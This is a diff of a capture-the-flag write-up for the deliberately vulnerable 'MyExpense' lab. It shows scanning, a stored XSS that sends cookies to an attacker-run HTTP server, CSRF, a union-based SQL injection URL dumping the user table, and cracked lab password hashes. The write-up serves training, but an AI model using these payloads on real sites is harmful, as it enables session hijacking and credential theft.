@@ -1,10 +1,25 @@
 ---
-{"dg-publish":true,"permalink":"/write-ups/vuln-hub/my-expense/"}
+{"dg-publish":true,"permalink":"/write-ups/vuln-hub/my-expense/","tags":["CTF","write-up"]}
 ---
 
-From description we have the credentials:
-`samuel_fzghn4lw`
-# Scan
+---
+> [!INFO] Description
+> MyExpense is a deliberately vulnerable web application that allows you to train in detecting and exploiting different web vulnerabilities. Unlike a more traditional "challenge" application (which allows you to train on a single specific vulnerability), MyExpense contains a set of vulnerabilities you need to exploit to achieve the whole scenario.
+
+> [!INFO]- Scenario
+> You are "Samuel Lamotte" and you have just been fired by your company "Furtura Business Informatique". Unfortunately because of your hasty departure, you did not have time to validate your expense report for your last business trip, which still amounts to 750 € corresponding to a return flight to your last customer.
+Fearing that your former employer may not want to reimburse you for this expense report, you decide to hack into the internal application called **"MyExpense "** to manage employee expense reports.
+So you are in your car, in the company carpark and connected to the internal Wi-Fi (the key has still not been changed after your departure). The application is protected by username/password authentication and you hope that the administrator has not yet modified or deleted your access.
+Your credentials were: **samuel/fzghn4lw**
+Once the challenge is done, the flag will be displayed on the application while being connected with your (samuel) account.
+
+> [!FAQ]- Miscellaneous
+> If you need to restore the database : go to http://IP/config/setup.php
+> This works better with VirtualBox rather than VMware
+
+---
+# Active reconnaisance
+## Enum ports and services
 General scan
 PORT      STATE SERVICE REASON
 ```
@@ -14,8 +29,11 @@ PORT      STATE SERVICE REASON
   10   │ 54457/tcp open  unknown syn-ack ttl 64
   11   │ 59781/tcp open  unknown syn-ack ttl 64
 ```
-# Port 80
-## Focused scan
+
+---
+# Vuln analisis
+## Port 80
+### Focused scan
 ```
 PORT      STATE SERVICE VERSION
    6   │ 80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
@@ -28,7 +46,7 @@ PORT      STATE SERVICE VERSION
   13   │ |     PHPSESSID:
   14   │ |_      httponly flag not set
   ```
-## Checking `robots.txt`
+### Checking `robots.txt`
 ```
 User-agent: *
 Disallow: /admin/admin.php
@@ -36,7 +54,10 @@ Disallow: /admin/admin.php
 
 Fuzzing the page we just found `/admin` like above.
 
-## /admin/admin.php
+
+---
+# Exploitation
+admin/admin.php
 ![Pasted image 20240703173824.png](/img/user/Write-ups/VulnHub/attachments/Pasted%20image%2020240703173824.png)
 We found an admin panel.
 We have more info about us.
@@ -61,7 +82,7 @@ Trying XSS creating a new test user with the fields. Don't forget able the butto
 ![Pasted image 20240703180410.png](/img/user/Write-ups/VulnHub/attachments/Pasted%20image%2020240703180410.png)
 Check the admin panel and we have a XSS.
 ![Pasted image 20240703180550.png](/img/user/Write-ups/VulnHub/attachments/Pasted%20image%2020240703180550.png)
-# XSS
+## XSS
 To exploit this XSS we need the interaction of a some user, to check if some user is checking the admin panel.
 Create a new user with this code on the two last fields.
 ```js
@@ -73,7 +94,7 @@ Mount a server on the attacker machine.
 python -m http.server 80
 ```
 
-## Get the cookie
+### Get the cookie
 now in the js file put
 ```js
 var request = new XMLHttpRequest();
@@ -86,7 +107,7 @@ request.send();
 `knjvvrlahr23emlepkqn800ac2`
 We got some cookies, one of them is the admin account, but if use that cookie, we can't login, because the system admit just 1 login.
 
-# XSRF
+## XSRF
 Activate account
 Trying another way, if we try to activate the account we have.
 ![Pasted image 20240704171243.png](/img/user/Write-ups/VulnHub/attachments/Pasted%20image%2020240704171243.png)
@@ -114,20 +135,20 @@ Now validate the report. On the green button.
 We need that the financial person approve the payment
 in the rennes page we will try sqli.
 
-# SQLi
+## SQLi
 We break the query adding this.
 ![](/img/user/Write-ups/VulnHub/attachments/Screenshot_20240704_184024.png)
 Now get the information from db
-## DB names
+### DB names
 information_schema,myexpense,mysql,performance_schema
-## myexpense DB
+### myexpense DB
 expense,message,site,user
-### User Table
+#### User Table
 `http://192.168.122.204/site.php?id=2%20union%20select%201,group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27user%27--%20-`
 
 user_id,**username**,**password**,role,lastname,firstname,site_id.....e,max_statement_time
 
-## Username and password
+### Username and password
 **afoulon:124922b5d61dd31177ec83719ef8110a**
 **pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a**
 rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
@@ -150,7 +171,7 @@ Checking the admin panel again to see all accounts, we are interested on the `Fi
 `afoulon	Aristide	Foulon	afoulon@futuraBI.fr	Financial approver	2019-12-03 17:08:09`
 `pbaudouin	Paul	Baudouin	pbaudouin@futuraBI.fr	Financial approver	2019-12-03 17:08:09`
 
-# Cracking hashes
+## Cracking hashes
 Checking hashes.com
 
 afoulon:wq6hblv3
@@ -159,6 +180,8 @@ pbaudouin:HackMe
 Login in like `afoulon` and he don't have our report. But `pbaudouin` has it.
 ![](/img/user/Write-ups/VulnHub/attachments/Screenshot_20240704_205514.png)
 
-# Flag
 Login as Samuel and get the flag.
-![](/img/user/Write-ups/VulnHub/attachments/Screenshot_20240704_205739.png)
+> [!check]- User flag
+> ![](/img/user/Write-ups/VulnHub/attachments/Screenshot_20240704_205739.png)
+
+---
